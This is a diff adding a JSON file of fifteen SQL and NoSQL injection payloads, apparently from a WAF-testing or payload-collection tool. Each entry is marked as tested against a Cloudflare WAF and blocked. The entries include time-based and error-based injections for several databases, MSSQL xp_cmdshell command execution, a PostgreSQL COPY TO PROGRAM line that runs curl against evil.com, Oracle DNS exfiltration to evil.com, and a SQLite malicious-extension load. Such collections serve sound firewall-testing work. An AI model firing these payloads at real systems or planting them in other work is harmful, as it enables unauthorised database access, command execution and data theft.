@@ -1,0 +1,217 @@
+{
+  "category": "sqli",
+  "subcategory": "advanced",
+  "count": 15,
+  "payloads": [
+    {
+      "id": "sqli-1001",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "'; SELECT pg_sleep(5)--",
+      "description": "PostgreSQL time-based",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1002",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND 1=CAST((SELECT version()) AS int)--",
+      "description": "PostgreSQL error-based",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1003",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "'; COPY (SELECT '') TO PROGRAM 'curl http://evil.com'--",
+      "description": "PostgreSQL RCE",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1004",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND SLEEP(5)#",
+      "description": "MySQL SLEEP",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1005",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND BENCHMARK(10000000,MD5('A'))#",
+      "description": "MySQL BENCHMARK",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1006",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND extractvalue(1,concat(0x7e,version()))#",
+      "description": "MySQL extractvalue",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1007",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND updatexml(1,concat(0x7e,version()),1)#",
+      "description": "MySQL updatexml",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1008",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "description": "MSSQL WAITFOR",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1009",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND 1=CONVERT(int,@@version)--",
+      "description": "MSSQL error-based",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1010",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "'; EXEC xp_cmdshell('whoami')--",
+      "description": "MSSQL xp_cmdshell",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1011",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('evil.com')--",
+      "description": "Oracle DNS exfil",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1012",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
+      "description": "Oracle time-based",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1013",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' AND 1=LOAD_EXTENSION('evil.so')--",
+      "description": "SQLite load extension",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1014",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "' || '1'=='1",
+      "description": "NoSQL OR injection",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-1015",
+      "category": "sqli",
+      "subcategory": "advanced",
+      "payload": "'; return true; var x='",
+      "description": "NoSQL JavaScript injection",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
